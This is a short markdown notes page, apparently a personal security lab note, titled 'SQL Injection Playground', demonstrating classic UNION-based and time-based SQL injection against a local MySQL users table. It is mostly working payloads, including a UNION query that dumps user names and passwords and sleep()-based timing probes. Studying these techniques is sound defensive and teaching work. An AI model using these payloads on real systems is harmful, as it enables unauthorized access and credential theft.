# SQL Injection Playground

## Classic SQL Injection

```sql
mysql> select * from users where user_id = 1 order by 7;              
ERROR 1054 (42S22): Unknown column '7' in 'order clause'
mysql> select * from users where user_id = 1 order by 6;
mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-59-39.png)

```sql
select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-16-03-00.png)



## Time Based SQL Injection

```sql
mysql> select * from users where user_id = 1 or (select sleep(1)+1);
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-51-50.png)

```sql
select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
```

![](../../.gitbook/assets/screenshot-from-2018-11-17-15-53-52.png)

